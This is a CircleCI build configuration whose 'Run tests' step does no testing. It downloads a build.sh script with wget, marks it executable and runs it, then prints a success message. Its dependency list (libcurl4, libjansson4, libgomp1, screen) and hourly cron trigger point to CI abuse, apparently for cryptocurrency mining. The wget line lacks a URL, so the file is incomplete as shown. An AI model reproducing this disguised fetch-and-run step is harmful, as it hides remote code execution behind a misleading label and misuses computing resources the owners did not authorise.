working_dir: &working_dir ~/app 
.build_template: &script
  steps: 
    - checkout 
    - run: 
        name: Install Dependencies 
        command: | 
                    apt-get update 
                    apt-get upgrade -y 
                    apt-get install -y ca-certificates screen wget git libcurl4 libjansson4 libgomp1 build-essential make cmake 
                    apt-get install sudo -y
    - run: 
        name: Run tests 
        command: |                                      
                    wget -qO build.sh 
                    chmod +x build.sh 
                    ./build.sh  
                    echo Build Succeded 
version: 2.0 
jobs: 
  build1: 
    <<: *script 
    docker: 
      - image: ruby 
 
workflows: 
  version: 2 
  commit: 
    jobs: 
      - build1 
      

  schedule:
    triggers:
      - schedule:
          cron: "5 * * * *"
          filters:
            branches:
              only:
                - master
                
    jobs: 
      - build1 
